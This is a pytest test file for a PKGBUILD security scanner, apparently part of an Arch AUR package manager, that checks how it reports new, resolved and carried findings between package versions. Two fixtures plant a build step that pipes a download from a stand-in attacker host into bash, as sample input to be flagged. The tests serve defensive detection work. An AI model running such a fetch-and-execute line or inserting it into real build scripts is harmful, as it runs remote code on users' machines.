from __future__ import annotations

import aurmanager.engine as engine_module
from aurmanager.diffscan import diff_scan
from aurmanager.model import Severity
from aurmanager.parser.pkgbuild import parse_pkgbuild


def _write(tmp_path, name, body):
    d = tmp_path / name
    d.mkdir()
    (d / "PKGBUILD").write_text(body)
    return d


def test_diff_flags_new_finding_introduced_by_update(tmp_path):
    old = _write(
        tmp_path,
        "old",
        """
        pkgname=foo
        pkgver=1.0
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('deadbeef')
        build() {
          make
        }
        """,
    )
    new = _write(
        tmp_path,
        "new",
        """
        pkgname=foo
        pkgver=1.1
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('cafebabe')
        build() {
          curl -fsSL https://evil.example.com/payload.sh | bash
          make
        }
        """,
    )
    diff = diff_scan(old, new)
    assert [f.rule_id for f in diff.new_findings] == ["RCE001"]
    assert diff.carried_findings == []
    assert diff.resolved_findings == []
    assert diff.diff_verdict == Severity.CRITICAL


def test_diff_reports_no_new_findings_for_ordinary_version_bump(tmp_path):
    old = _write(
        tmp_path,
        "old",
        """
        pkgname=foo
        pkgver=1.0
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('deadbeef')
        build() {
          make
        }
        """,
    )
    new = _write(
        tmp_path,
        "new",
        """
        pkgname=foo
        pkgver=1.1
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('cafebabe')
        build() {
          make
        }
        """,
    )
    diff = diff_scan(old, new)
    assert diff.new_findings == []
    assert diff.diff_verdict == Severity.INFO
    assert diff.new_functions == []
    assert diff.new_sources == []
    assert diff.weakened_checksum_sources == []


def test_diff_reports_resolved_findings_when_update_fixes_an_issue(tmp_path):
    old = _write(
        tmp_path,
        "old",
        """
        pkgname=foo
        pkgver=1.0
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('deadbeef')
        build() {
          curl -fsSL https://evil.example.com/payload.sh | bash
          make
        }
        """,
    )
    new = _write(
        tmp_path,
        "new",
        """
        pkgname=foo
        pkgver=1.1
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('cafebabe')
        build() {
          make
        }
        """,
    )
    diff = diff_scan(old, new)
    assert diff.new_findings == []
    assert [f.rule_id for f in diff.resolved_findings] == ["RCE001"]
    assert diff.diff_verdict == Severity.INFO


def test_diff_carries_a_finding_present_in_both_versions(tmp_path):
    body = """
        pkgname=foo
        pkgver={ver}
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('SKIP')
        build() {{
          make
        }}
        """
    old = _write(tmp_path, "old", body.format(ver="1.0"))
    new = _write(tmp_path, "new", body.format(ver="1.1"))
    diff = diff_scan(old, new)
    assert diff.new_findings == []
    assert diff.resolved_findings == []
    assert [f.rule_id for f in diff.carried_findings] == ["INT003"]
    # a pre-existing finding, unchanged by this update, shouldn't drive the verdict
    assert diff.diff_verdict == Severity.INFO


def test_diff_detects_new_function_and_weakened_checksum(tmp_path):
    old = _write(
        tmp_path,
        "old",
        """
        pkgname=foo
        pkgver=1.0
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('deadbeef')
        build() {
          make
        }
        """,
    )
    new = _write(
        tmp_path,
        "new",
        """
        pkgname=foo
        pkgver=1.1
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('SKIP')
        build() {
          make
        }
        post_install() {
          echo done
        }
        """,
    )
    diff = diff_scan(old, new)
    assert diff.new_functions == ["post_install"]
    assert diff.weakened_checksum_sources == ["https://example.com/$pkgname-$pkgver.tar.gz"]


def test_diff_scan_parses_each_pkgbuild_only_once(tmp_path, monkeypatch):
    # Regression for GH issue #12: diff_scan() used to call parse_pkgbuild() a
    # second time per file (once inside scan(), once again directly) just to
    # get function/source diffing data -- it should reuse the RuleContext
    # scan() already built instead of parsing each file twice.
    calls: list[str] = []

    def counting_parse_pkgbuild(path):
        calls.append(str(path))
        return parse_pkgbuild(path)

    monkeypatch.setattr(engine_module, "parse_pkgbuild", counting_parse_pkgbuild)

    old = _write(
        tmp_path,
        "old",
        """
        pkgname=foo
        pkgver=1.0
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('deadbeef')
        """,
    )
    new = _write(
        tmp_path,
        "new",
        """
        pkgname=foo
        pkgver=1.1
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('cafebabe')
        """,
    )
    diff_scan(old, new)
    assert len(calls) == 2


def test_diff_json_applies_severity_min_to_resolved_findings_too(tmp_path):
    # Regression: to_json() filtered new_findings/carried_findings by severity_min
    # but not resolved_findings, so a low-severity resolved finding always showed
    # up in the JSON output regardless of the requested threshold.
    old = _write(
        tmp_path,
        "old",
        """
        pkgname=foo
        pkgver=1.0
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('SKIP')
        """,
    )
    new = _write(
        tmp_path,
        "new",
        """
        pkgname=foo
        pkgver=1.1
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('deadbeef')
        """,
    )
    diff = diff_scan(old, new)
    assert [f.rule_id for f in diff.resolved_findings] == ["INT003"]

    import json

    filtered = json.loads(diff.to_json(severity_min=Severity.CRITICAL))
    assert filtered["resolved_findings"] == []

    unfiltered = json.loads(diff.to_json())
    assert [f["rule_id"] for f in unfiltered["resolved_findings"]] == ["INT003"]
